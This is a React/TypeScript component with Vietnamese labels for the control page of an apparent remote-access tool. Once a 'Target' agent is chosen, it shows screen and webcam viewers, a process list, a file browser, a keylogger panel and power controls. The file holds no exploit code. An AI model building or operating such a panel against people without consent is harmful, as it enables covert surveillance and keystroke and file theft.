import { useEffect, useState } from 'react';
import type { Agent } from '../types/protocol';
import { ConnectionBadge } from '../components/ConnectionBadge';
import { ScreenViewer } from '../components/ScreenViewer';
import { WebcamViewer } from '../components/WebcamViewer';
import { ProcessList } from '../components/ProcessList';
import { FileBrowser } from '../components/FileBrowser';
import { KeyloggerPanel } from '../components/KeyloggerPanel';
import { PowerControls } from '../components/PowerControls';
import { wsClient } from '../services/wsClient';

export function ControlPage({
  token,
  sessionId,
  agent,
  connectionState,
  onLeave,
}: {
  token: string;
  sessionId: string;
  agent: Agent;
  connectionState: string;
  onLeave: () => void;
}) {
  const [securityWarning, setSecurityWarning] = useState<string | null>(null);

  useEffect(() =>
    wsClient.subscribe(message => {
      if (message.sessionId !== sessionId) return;
      if (message.action === 'ERROR') {
        const errorMsg = String(message.payload.message ?? 'Cảnh báo hệ thống');
        setSecurityWarning(errorMsg);
      }
    }), [sessionId]);

  return (
    <main className="control">
      <header>
        <div>
          <button className="link" onClick={onLeave}>← Đổi Target</button>
          <p className="eyebrow">PHIÊN ĐIỀU KHIỂN</p>
          <h1>{agent.name}</h1>
          <code>{agent.id}</code>
        </div>
        <ConnectionBadge state={connectionState} />
      </header>

      {securityWarning && (
        <div
          className="security-alert-banner"
          style={{
            background: '#450a0a',
            border: '2px solid #ef4444',
            color: '#fef2f2',
            padding: '1rem 1.25rem',
            borderRadius: '10px',
            marginBottom: '1.25rem',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center',
            boxShadow: '0 4px 12px rgba(239, 68, 68, 0.25)'
          }}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '0.85rem' }}>
            <span style={{ fontSize: '1.75rem' }}>🚨</span>
            <div>
              <strong style={{ fontSize: '1.05rem', color: '#fca5a5', letterSpacing: '0.5px' }}>
                CẢNH BÁO BẢO MẬT HỆ THỐNG
              </strong>
              <p style={{ margin: '0.25rem 0 0', fontSize: '0.95rem', lineHeight: '1.4' }}>
                {securityWarning}
              </p>
            </div>
          </div>
          <button
            className="compact danger"
            onClick={() => setSecurityWarning(null)}
            style={{
              padding: '0.4rem 0.85rem',
              marginLeft: '1rem',
              whiteSpace: 'nowrap',
              background: '#b91c1c',
              borderColor: '#f87171'
            }}
          >
            ✕ Đã hiểu
          </button>
        </div>
      )}

      <div className="grid top-grid">
        <ScreenViewer sessionId={sessionId} />
        <WebcamViewer sessionId={sessionId} />
      </div>

      <div className="grid">
        <ProcessList sessionId={sessionId} />
        <FileBrowser sessionId={sessionId} />
      </div>

      <div className="grid">
        <KeyloggerPanel sessionId={sessionId} />
        <PowerControls sessionId={sessionId} token={token} />
      </div>
    </main>
  );
}
